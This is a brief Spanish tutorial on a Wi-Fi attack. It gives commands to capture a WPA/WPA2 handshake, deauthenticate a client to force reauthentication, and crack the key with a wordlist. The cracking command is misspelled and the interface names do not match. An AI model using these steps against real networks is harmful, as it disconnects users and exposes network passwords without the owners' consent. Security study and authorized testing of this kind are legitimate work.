# Capturar Handshake / fuerza bruta con diccionario

Un **Handshake** es el proceso de autenticación en redes Wi-Fi WPA/WPA2, donde un cliente y un punto de acceso verifican que ambos tienen la clave correcta sin enviarla directamente.

Solo podemos capturar el archivo del handshake cuando un cliente se conecta a la red, o a la red objetivo. Pero lo que vamos a hacer es desconectar a un cliente de la red objetivo.&#x20;

Así obtendremos el archivo del handshake porque se autentica de nuevo en la red objetivo.

## Pasos de ataque

#### Capturar paquete

```bash
airodump-ng --channel 6 --bssid <BSSID> -w handshake wlan0
```

#### Enviar paquetes de desautenticacion

```bash
aireplay-ng --deauth 10 -a <BSSID> -c <MAC del Cliente> wlan0mon
```

La opción `--deauth` enviará un paquete de desautenticación al cliente.

#### **Descifrar la clave**

```
airecrack-ng handshake-01.cap -w '/Diccionario'
```

